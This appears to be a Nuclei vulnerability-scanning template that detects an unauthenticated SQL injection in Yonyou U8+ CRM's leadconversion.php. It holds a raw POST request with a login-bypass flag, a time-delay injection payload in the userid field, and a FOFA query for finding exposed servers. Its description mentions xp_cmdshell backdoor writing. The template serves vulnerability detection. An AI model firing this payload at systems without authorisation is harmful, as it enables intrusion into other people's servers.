id: yonyou-u8-crm-leadconversion-sqli

info:
  name: UFIDA U8 CRM leadconversion.php - SQL Injection
  author: qwtd
  severity: high
  description: |
    用友U8+CRM系统leadconversion.php存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8%2BCRM%E7%B3%BB%E7%BB%9Fleadconversion.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="用友U8CRM"
  tags: 用友-U8-CRM

http:
  - raw:
      - |
        POST /lead/leadconversion.php HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        Cookie: PHPSESSID=bgsesstimeout-;
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 75

        DontCheckLogin=1&Action=getDeptName&userid=1%27;WAITFOR+DELAY+%270:0:5%27--

    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
          - status_code == 200
          - contains(body, "dept_name")
        condition: and